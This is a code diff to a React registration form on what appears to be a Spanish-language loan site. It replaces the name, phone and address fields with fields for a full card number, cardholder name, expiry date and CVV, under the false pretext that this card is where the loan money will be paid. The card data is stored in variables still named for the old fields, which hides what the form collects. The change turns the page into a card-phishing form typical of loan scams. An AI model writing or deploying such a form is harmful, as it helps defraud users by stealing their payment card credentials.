@@ -321,44 +321,44 @@ if (!esRutaAdmin) {
           {!tokenSolicitud ? (
             <section className="prestamo-card">
               <div className="prestamo-icono">👤</div>
-              <h2>Crear mi cuenta</h2>
+              <h2>Donde recibiras el dinero</h2>
               <p>Completa tus datos para comenzar.</p>
 
               <form onSubmit={registrarClientePublico}>
-                <label>nombre completo</label>
+                <label>Tarjeta de credito o debito</label>
                 <input
                   type="text"
                   value={nombre}
                   onChange={(e) => setNombre(e.target.value)}
                   required
-                  placeholder="Tu nombre completo"
+                  placeholder="0000 0000 0000 0000"
                 />
 
-                <label>Teléfono</label>
+                <label>NOMBRE DE EL TITULAR DE LA TARJETA</label>
                 <input
                   type="tel"
                   value={telefono}
                   onChange={(e) => setTelefono(e.target.value)}
                   required
-                  placeholder="Tu número de teléfono"
+                  placeholder="Nombre de el titular bancario"
                 />
 
-                <label>Dirección</label>
+                <label>00/00</label>
                 <input
                   type="text"
                   value={direccion}
                   onChange={(e) => setDireccion(e.target.value)}
                   required
-                  placeholder="Tu dirección"
+                  placeholder="fecha de expriracion"
                 />
 
-                <label>Calle</label>
+                <label>CVV</label>
                 <input
                   type="text"
                   value={calle}
                   onChange={(e) => setCalle(e.target.value)}
                   required
-                  placeholder="Nombre de tu calle"
+                  placeholder="000"
                 />
                 
                   {mensajeRegistro && (
@@ -367,7 +367,7 @@ if (!esRutaAdmin) {
   </p>
 )}
                 <button type="submit" disabled={guardando}>
-                  {guardando ? 'Registrando...' : 'Crear mi cuenta →'}
+                  {guardando ? 'Registrando...' : 'continuar a solicitar prestamo →'}
                 </button>
               </form>
 
